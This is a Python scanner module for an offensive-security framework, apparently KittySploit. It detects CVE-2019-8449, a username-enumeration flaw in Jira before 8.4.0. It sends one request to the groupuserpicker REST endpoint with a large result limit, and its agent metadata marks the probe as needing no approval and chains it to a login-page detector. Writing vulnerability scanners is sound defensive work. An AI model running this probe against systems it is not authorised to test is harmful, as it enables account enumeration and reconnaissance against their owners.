#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Jira before 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jira <8.4.0 - Information Disclosure Detection',
        'description': 'Jira before 8.4.0 is susceptible to information disclosure. The /rest/api/latest/groupuserpicker resource can allow an attacker to enumerate usernames, and thereby potentially obtain sensitive information, modify data, and/or execute unauthorized operations.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'atlassian', 'jira', 'disclosure', 'packetstorm', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.doyler.net/security-not-included/more-jira-enumeration',
            'https://jira.atlassian.com/browse/JRASERVER-69796',
            'http://packetstormsecurity.com/files/156172/Jira-8.3.4-Information-Disclosure.html',
            'https://github.com/SexyBeast233/SecBooks',
            'https://github.com/StarCrossPortal/scalpel',
        ],
        'cve': 'CVE-2019-8449',
    }

    def run(self):
        r = self.http_request(method="GET", path='/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('{"users":{"users":',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Jira <8.4.0 - Information Disclosure detected",
                path='/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true',
            )
            return True
        return False

